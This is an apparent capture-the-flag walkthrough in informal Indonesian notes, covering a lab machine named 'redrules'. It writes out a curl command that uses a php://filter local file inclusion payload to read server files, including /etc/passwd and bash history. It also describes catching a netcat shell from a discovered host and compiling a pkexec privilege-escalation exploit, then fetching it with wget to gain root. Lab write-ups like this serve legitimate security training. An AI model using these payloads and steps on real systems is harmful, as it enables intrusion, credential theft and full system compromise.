1. scan 80 22 kebuka 
2. di fuzz gada apa apa coba lfi juga kok aneh
3. https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb 
4. ternyata gini: curl --silent "http://$IP/index.php?page=php://filter/convert.base64-encode/resource=rid_mana" | base64 -d
5. rid /etc/passwd -> /home/user/.bash_history -> sama file yg di command in stdout noh 
6. klaim flag -> sudo -l gabisa -> linpeash gada apa apa -> pspy64 ada nyambung ke host redrules
7. echo "ipmu redrules.thm" >> /etc/hosts -> nyalain nc ip yg di pspy coba
8. kesambung -> ke .git -> pkexec ada exp nya cari aja 
9. gcc -shared pkexec_exp.c -o exp -Wl,-e,entry -fPIC -> wget kesitu run 
10. klaim root
